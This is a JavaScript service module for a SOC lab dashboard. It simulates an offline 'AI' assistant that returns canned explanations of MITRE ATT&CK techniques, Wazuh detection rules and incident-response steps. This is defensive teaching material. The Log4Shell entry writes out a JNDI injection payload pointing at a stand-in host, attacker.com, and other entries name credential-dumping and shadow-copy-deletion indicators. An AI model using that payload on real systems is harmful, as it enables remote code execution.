const delay = (ms = 700) => new Promise(r => setTimeout(r, ms));

// Knowledge base — mirrors AIChat.jsx but as a service layer
// so other components can call AI queries programmatically.
const KNOWLEDGE = {
  'T1003.001': `**T1003.001 — LSASS Memory Credential Dumping**
Adversaries dump LSASS process memory to extract plaintext or hashed credentials.
Detected by Wazuh rule 100013 (level 15) via Sysmon EventID 10 when any process opens lsass.exe with GrantedAccess=0x1FFFFF.
Response: isolate host immediately, assume all cached credentials compromised, rotate all passwords.`,

  'T1059.001': `**T1059.001 — PowerShell Execution**
Adversaries use PowerShell to execute commands, scripts, and encoded payloads.
Detected by Wazuh rule 100005 (level 12) when powershell.exe launches with -EncodedCommand, -WindowStyle Hidden, or bypass execution policy flags.
Response: capture command line arguments, decode base64 payload, trace parent process chain.`,

  'T1110.001': `**T1110.001 — SSH Brute Force**
Adversaries attempt many passwords against SSH to gain access.
Detected by Wazuh rule 100001 (level 10) when 10+ failures occur within 60 seconds from the same source IP.
Response: enrich source IP via AbuseIPDB, block if score > 50%, create TheHive case.`,

  'T1190': `**T1190 — Exploit Public-Facing Application**
Adversaries exploit vulnerabilities in externally accessible applications.
Log4Shell (CVE-2021-44228) is detected by Wazuh rule 100019 (level 15) via JNDI lookup patterns in Apache access logs.
Response: patch Log4j to >= 2.17.1, block outbound LDAP/RMI, isolate if exploitation confirmed.`,

  'T1490': `**T1490 — Inhibit System Recovery**
Adversaries delete shadow copies to prevent recovery after ransomware deployment.
Detected by Wazuh rule 100012 (level 15) when vssadmin.exe is called with 'delete shadows'.
Response: this is a ransomware pre-attack stage — isolate immediately, preserve forensic image, notify IR team.`,

  'log4shell': `**Log4Shell — CVE-2021-44228**
Critical RCE via JNDI injection in Apache Log4j 2.x.
Attack payload: \${jndi:ldap://attacker.com:1389/payload} in any logged field.
Lab detection: Wazuh rule 100019, Suricata SID 9000006.
Remediation: upgrade Log4j >= 2.17.1, set log4j2.formatMsgNoLookups=true.`,

  'rule 100001': `**Wazuh Rule 100001 — SSH Brute Force**
Level: 10 | Group: auth_failed | MITRE: T1110.001
Fires when 10+ SSH authentication failures occur from the same IP within 60 seconds.
This is the primary brute force detection rule for Linux/Ubuntu systems.`,

  'rule 100013': `**Wazuh Rule 100013 — LSASS Memory Access**
Level: 15 (maximum) | Group: windows | MITRE: T1003.001
Fires on Sysmon EventID 10 when any process opens lsass.exe.
Matches the GrantedAccess pattern 0x1FFFFF used by Mimikatz and similar tools.`,

  'ransomware': `**Ransomware Pre-Attack Response**
Indicators in your lab: shadow copy deletion (rule 100012), mass file modification (rule 100011).
Immediate response (0-15 min): isolate host, preserve memory dump, identify blast radius, notify IR team and management.
Recovery: restore from last clean backup, verify backup integrity, patch entry vector before reconnecting.`,

  'ioc block': `**IOC Blocking Procedure**
Use block_ip.py from 16_AI_Automation/:
  python3 block_ip.py --ip <IP> --reason "AbuseIPDB 94%"
This adds an iptables DROP rule and a pfSense WAN block simultaneously.
Currently blocked in your lab: 203.0.113.45 (94%), 198.51.100.99 (99%), 203.0.113.78 (71%).`,
};

function generateLocalResponse(message) {
  const q = message.toLowerCase();
  for (const [key, response] of Object.entries(KNOWLEDGE)) {
    if (q.includes(key.toLowerCase())) return response;
  }
  if (q.includes('alert') || q.includes('critical') || q.includes('summary')) {
    return `**Current Alert Summary**
Your SOC lab has 12 active alerts: 5 critical, 4 high, 2 medium, 1 low.
Critical alerts: LSASS access (rule 100013), shadow copy deletion (rule 100012), new admin account (rule 100009), Log4Shell (rule 100019), honeypot interaction (rule 100017).
All are consolidated in case CASE-2024-0047. Source IPs 203.0.113.45 and 198.51.100.99 are blocked.`;
  }
  if (q.includes('mitre') || q.includes('att&ck') || q.includes('coverage')) {
    return `**MITRE ATT&CK Coverage**
Your 20 custom Wazuh rules cover: Credential Access (T1003, T1110), Execution (T1059, T1047), Persistence (T1547, T1136), Defense Evasion (T1027, T1105, T1218), Impact (T1486, T1490), Initial Access (T1190), Discovery (T1046).
Coverage rate: approximately 74% of common Enterprise ATT&CK techniques. Run mitre_heatmap.py to generate a Navigator layer.`;
  }
  return `I can help with alerts, MITRE techniques, IOC analysis, and incident response guidance.
Try asking about: a specific Wazuh rule (e.g. "rule 100013"), a MITRE technique (e.g. "T1059.001"), a threat scenario (e.g. "ransomware response"), or current IOCs to block.`;
}

export const aiService = {

  async chat(message, conversationHistory = []) {
    await delay(600 + Math.random() * 400);
    if (!message?.trim()) throw new Error('Message cannot be empty');

    const response = generateLocalResponse(message);
    return {
      role:      'assistant',
      content:   response,
      timestamp: new Date().toISOString(),
      model:     'soc-local-kb-v1',
      tokens:    { input: message.length, output: response.length },
    };
  },

  async analyseAlert(alert) {
    await delay();
    if (!alert) throw new Error('Alert data required');

    const mitreTechniques = (alert.mitre || []).join(', ') || 'Unknown';
    return {
      role:    'assistant',
      content: `**Alert Analysis: ${alert.description || alert.id}**
Severity: ${alert.severity} | Rule: ${alert.rule_id} | Agent: ${alert.agent_name}
MITRE: ${mitreTechniques}
${alert.src_ip ? `Source IP: ${alert.src_ip} — recommend AbuseIPDB enrichment.` : ''}
Recommended action: ${
  alert.severity === 'critical'
    ? 'IMMEDIATE — isolate host, create P1 TheHive case, page on-call analyst.'
    : alert.severity === 'high'
    ? 'URGENT — enrich IOCs, create case, block source IP if confirmed malicious.'
    : 'NORMAL — investigate during business hours, document findings.'
}`,
      timestamp: new Date().toISOString(),
    };
  },

  async suggestPlaybook(caseData) {
    await delay();
    const mitre = (caseData?.mitre || []).join(',');
    let playbook = 'General Incident Response';
    if (mitre.includes('T1003')) playbook = 'Credential Dumping Response';
    else if (mitre.includes('T1110')) playbook = 'SSH Brute Force Response';
    else if (mitre.includes('T1490') || mitre.includes('T1486')) playbook = 'Ransomware Pre-Attack';
    else if (mitre.includes('T1190')) playbook = 'Web Exploitation Response';

    return {
      suggestedPlaybook: playbook,
      reasoning:         `Based on MITRE techniques: ${mitre || 'none identified'}.`,
      steps: [
        'Verify true positive vs false positive',
        'Enrich all IOCs via AbuseIPDB and VirusTotal',
        'Block confirmed malicious IPs via block_ip.py',
        'Create or update TheHive case',
        'Notify appropriate team via Slack',
      ],
    };
  },

  async getCapabilities() {
    await delay(50);
    return {
      topics: [
        'Wazuh rule explanations (100001–100020)',
        'MITRE ATT&CK technique details',
        'IOC enrichment recommendations',
        'Incident response playbooks',
        'Alert triage guidance',
        'Threat intel interpretation',
      ],
      model:   'SOC Local Knowledge Base v1.0',
      offline: true,
    };
  },

  async getSuggestedPrompts() {
    await delay(50);
    return [
      'Summarise all critical alerts',
      'Explain MITRE T1003.001 (LSASS credential dumping)',
      'What does Wazuh rule 100013 detect?',
      'How should I respond to ransomware pre-attack indicators?',
      'Which IOCs should I block right now?',
      'Explain the Log4Shell vulnerability',
    ];
  },
};